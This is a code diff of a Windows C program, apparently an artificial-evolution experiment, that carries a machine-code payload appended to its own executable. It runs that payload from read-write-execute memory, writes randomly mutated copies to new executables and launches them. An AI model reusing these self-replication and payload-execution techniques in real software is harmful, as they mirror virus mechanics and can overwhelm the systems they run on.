@@ -23,8 +23,6 @@ PROCESS_INFORMATION pi;
 
 struct timeb AccuTime;
 
-int MuPos = 0;
-
 //typedef void(*myFunc)(void);
 //void(*f1)(void) = (void(*)(void)) executeableMem;
 //static UINT8 myTestcode[] = { 0x90, 0x90, 0x90, 0xCC, 0xC3 };
@@ -41,24 +39,22 @@ int main(int argc, char** argv)
     fseek(fp, 0, SEEK_END);
     myEXESize = ftell(fp);
     fseek(fp, 0, SEEK_SET);
-    myFileBuffer = (UINT8 *)malloc(myEXESize);
+    myFileBuffer = (UINT8*)VirtualAlloc(0, myEXESize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     fread(myFileBuffer, 1, myEXESize, fp);
     fclose(fp);
     for (int i = 0; i < myEXESize - 3; i++)
         if (myFileBuffer[i] == 0x23 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90 && myFileBuffer[i + 3] == 0x90)
         {
-            //printf("Found Payload Start @ 0x%X\n", i);
+            printf("Found Payload Start @ 0x%X\n", i);
             myStaticLength = i;
-            myPayloadLength = myEXESize - myStaticLength;
-            executeableMem = (UINT8*)VirtualAlloc(0, myPayloadLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-            memcpy(executeableMem, myFileBuffer + myStaticLength, myPayloadLength);
-            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(executeableMem + 1), 0, 0, 0);
+            executeableMem = myFileBuffer + myStaticLength + 1;
+            CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(executeableMem), 0, 0, 0);
             break;
         }
     if (myStaticLength == 0) // This is the Soozoo version!
     {
         myStaticLength = myEXESize;
-        nextPayloadBuf = (UINT8*)malloc(NextPayloadSize);
+        nextPayloadBuf = (UINT8*)VirtualAlloc(0, NextPayloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         nextPayloadBuf[0] = 0x23;
         for (int i = 1; i < NextPayloadSize - 1; i++)
         {
@@ -69,7 +65,7 @@ int main(int argc, char** argv)
     else
     {
         nextPayloadBuf = myFileBuffer + myStaticLength;
-        NextPayloadSize = myPayloadLength;
+        NextPayloadSize = myEXESize - myStaticLength;
     }
 
     for (int i = 0; i < NextNum; i++)
@@ -81,17 +77,34 @@ int main(int argc, char** argv)
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
         fclose(fp);
         //CreateProcessA(nextEXEName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
-        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_HIDE);
+        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
         Sleep(GapTime);
         //nextPayloadBuf[MuPos] = 0x90;
     }
-    
 }
 
 void MuNxtPayload()
 {
-    MuPos = rand() % (NextPayloadSize - 5) + 4;
-    nextPayloadBuf[MuPos] = rand() % 256;
+    int MuPos = 0;
+    UINT8 bakupData = 0;
+    while(1)
+    {
+        printf("Finding Liveable Mutation Position...\n");
+        MuPos = rand() % (NextPayloadSize - 5) + 4; // Keep first 4 bytes and last 1 byte
+        bakupData = nextPayloadBuf[MuPos];
+        nextPayloadBuf[MuPos] = rand() % 256;
+        __try
+        {
+            ((void(*)())(nextPayloadBuf + 1))();
+            printf("Mutation Success @ 0x%X\n", MuPos);
+            break;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER)
+        {
+            printf("Mutation Failed @ 0x%X, revert data\n", MuPos);
+            nextPayloadBuf[MuPos] = bakupData;
+        }
+    }
 }
 
 void GenNxtPayload()
